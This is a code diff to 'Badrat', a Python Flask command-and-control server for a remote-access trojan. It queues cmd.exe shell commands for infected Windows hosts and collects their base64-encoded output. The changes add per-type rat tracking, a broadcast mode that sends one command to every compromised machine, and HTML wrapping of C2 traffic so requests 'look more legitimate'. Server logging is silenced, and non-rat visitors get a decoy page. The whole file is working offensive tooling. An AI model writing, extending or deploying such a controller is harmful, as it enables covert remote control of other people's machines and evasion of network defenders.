@@ -13,71 +13,104 @@ import os
 RED = '\033[91m'
 ENDC = '\033[0m'
 UNDERLINE = '\033[4m'
+
 port=8080
 commands = {}
 rats = {}
+types = {}
+
+#Wrap C2 comms in html and html2 code to make requests look more legitimate
+def htmlify(data):
+    html = "<html><head><title>http server</title></head>\n"
+    html += "<body>\n"
+    html += "<b>\n"
+    html2 = "</b>\n"
+    html2 = "</body></html>\n"
+    return(html + data + html2)
+
+# Page sent to "unauthorized" users of the http listener
+def default_page():
+    message = "WTF who are you go away"
+    return(htmlify(message))
+
+# Print colors according to the rat type
+def colors(value):
+    BOLD = '\033[1m'
+    c = '\033[91m'  # Red
+    py = '\033[92m'   # Green
+    js = '\033[93m'   # Yellow
+    ps1 = '\033[94m'  # Blue
+    hta = '\033[95m'  # Purple
+    colors = {"c":c, "py":py, "js":js, "ps1":ps1, "hta":hta}
+    if(value in colors.keys()):
+        return(colors[value] + value + ENDC)
+    elif(value in types.keys()):
+        return(colors[types[value]] + value + ENDC)
+    elif(value == "all"):
+        return(UNDERLINE + BOLD + "ALL RATS" + ENDC)
+    else:
+        return("[!] Something wrong with colors")
 
 def serve_server(port=8080):
     app = Flask(__name__)
 
-    html = "<html><head><title>http server</title></head>\n"
-    html += "<body>\n"
-    html += "<b>\n"
-    #Wrap C2 comms in html and html2 code to make requests look more legitimate
-    html2 = "</b>\n"
-    html2 = "</body></html>\n"
-
     #Disable annoying console output for GET/POST requests
     log = logging.getLogger('werkzeug')
-    log.setLevel(logging.ERROR)
+    log.disabled = True
 
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['GET'])
     def gtfo(path):
         # The rat code uses the POST method ONLY! A GET request is not from a rat
         print("[!] GET request from non-rat client requested path /" + path)
-        return(html + "WTF who are you? go away pls\n" + html2)
+        return(default_page())
 
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['POST'])
     def badrat_comms(path):
-
         # Parse POST parameters
         post_json = request.get_json(force=True)
         post_dict = dict(post_json)
-        ratID = str(post_dict['agentid'])
+        try:
+            ratID = str(post_dict['id'])
+            ratType = str(post_dict['type'])
+        except:
+            print("[!] Post request against listener with no \"id\" or \"type\" parameter")
+            return(default_page())
 
-        if("agentid" in post_dict.keys()):
-            # Update checkin time for an agent every checkin
-            checkin = time.strftime("%H:%M:%S", time.localtime())
-            rats[ratID] = checkin
+        # Update checkin time for an agent every checkin
+        checkin = time.strftime("%H:%M:%S", time.localtime())
+        rats[ratID] = checkin
+        types[ratID] = ratType
 
-            # If there is no current command for a rat, create a blank one
-            if not ratID in commands:
-                commands[ratID] = ""
+        # If there is no current command for a rat, create a blank one
+        if not ratID in commands:
+            commands[ratID] = ""
 
         if("retval" in post_dict.keys()):
-            print("\nResults from rat " + str(post_dict['agentid']) + "\n")
+            print("\nResults from rat " + str(post_dict['id']) + "\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
 
-        return(html + json.dumps({"cmd": commands[ratID]}) + "\n" + html2)
+        return(htmlify(json.dumps({"cmnd": commands[ratID]}) + "\n"))
 
     app.run(host="0.0.0.0", port=port)
 
 def get_rats():
-    print("\nrat ID\t\tcheck-in")
-    print("--------\t--------")
-    for rat, checkin in rats.items():
-        print(rat + "    \t" + checkin)
+    print("\nrat ID\t\ttype\tcheck-in")
+    print("--------\t----\t--------")
+    for ratID, checkin in rats.items():
+        print(ratID + "    \t" + colors(types[ratID]) + "  \t" + checkin)
     print("")
 
 def remove_rat(ratID):
     if(ratID == "all"):
         print("[*] Removing ALL rats")
         rats.clear()
+        types.clear()
     else:
         try:
             del rats[ratID]
+            del types[ratID]
             print("[*] Removing rat " + ratID)
         except:
             print("[!] Can't delete rat " + ratID + " for some reason")
@@ -92,14 +125,16 @@ def get_help():
     print("rats/agents/sessions -- gets the list of rats and their last checkin time")
     print("exit -- exits the badrat console and shuts down the listener")
     print("<ratID> -- start interacting with the specified rat")
+    print("all -- start interacting with ALL rats")
     print("back -- backgrounds the current rat and goes to the main menu")
-    print("remove -- unregisters the specified <ratID> OR \"all\" for all rats")
+    print("remove all -- unregisters ALL rats")
+    print("remove <ratID> -- unregisters the specified <ratID>")
+    print("clear -- clear the screen. ")
     print("")
     print("Rat commands: -- commands to interact with a badrat rat")
     print("kill -- when interacting with a rat, type kill to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new wscript process.")
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
-    print("clear -- clear the screen. ")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -116,14 +151,14 @@ if __name__ == "__main__":
     print("[*] Starting HTTP listener on port " + str(port) + "\n\n")
     server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
     server.start()
-    time.sleep(1)
+    time.sleep(0.5)
     if not server.is_alive():
         print("[!] Could not start listener!")
         sys.exit()
 
 # Main menu
 while True:
-    inp = input("Badrat //> ")
+    inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
 
     # Check if the operator wants to quit badrat
     if(inp == "exit" or inp == "quit"):
@@ -133,7 +168,7 @@ while True:
     elif(inp == "help"):
         get_help()
 
-    # View rats and their latest checkin times
+    # View rats, their types, and their latest checkin times
     elif(inp == "agents" or inp == "rats" or inp == "sessions"):
         get_rats()
 
@@ -143,16 +178,16 @@ while True:
             remove_rat("all")
         else:
             remove_rat(inp.split(" ")[1])
-    
+
     # Clear the screen
     elif(inp == "clear"):
         os.system("clear")
 
     # Enter rat specific command prompt
-    elif(inp in rats.keys()):
+    elif(inp in rats.keys() or inp == "all"):
         ratID = inp
         while True:
-            inp = input(RED + ratID + ENDC + " \\\\> ")
+            inp = input(colors(ratID) + " \\\\> ")
             if(inp == "back" or inp == "exit"):
                 break
             elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
@@ -165,5 +200,10 @@ while True:
                 if(inp == "kill"):
                     print("[*] Tasked rat " + ratID + " to " + RED + "commit Seppuku" + ENDC)
                 else:
-                    print("[*] Queued command " + UNDERLINE + inp + ENDC + " for " + ratID)
-                commands[ratID] = inp
+                    print("[*] Queued command " + UNDERLINE + inp + ENDC + " for " + colors(ratID))
+                if(ratID == "all"):
+                    # update ALL commands
+                    for i in commands.keys():
+                        commands[i] = inp
+                else:
+                    commands[ratID] = inp
